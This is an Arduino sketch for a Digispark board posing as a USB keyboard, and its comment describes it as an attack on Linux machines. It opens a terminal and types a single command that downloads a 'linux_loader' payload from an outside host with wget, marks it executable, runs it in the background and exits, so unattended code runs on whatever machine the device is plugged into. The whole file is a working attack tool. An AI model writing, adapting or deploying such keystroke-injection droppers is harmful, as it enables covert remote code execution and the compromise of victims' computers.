#include "DigiKeyboard.h"


/***
 * 
 * This is an attack for Linux machines. It opens up a terminal window. It then downloads the loader, sets it to executable,
 * executes it, and closes the terminal window.
 * 
 ***/

void setup() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_T , MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("nohup wget https://sheep.casa/payloads/linux_loader -P /tmp && nohup chmod +x /tmp/linux_loader && nohup /tmp/linux_loader & exit");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}

void loop() {}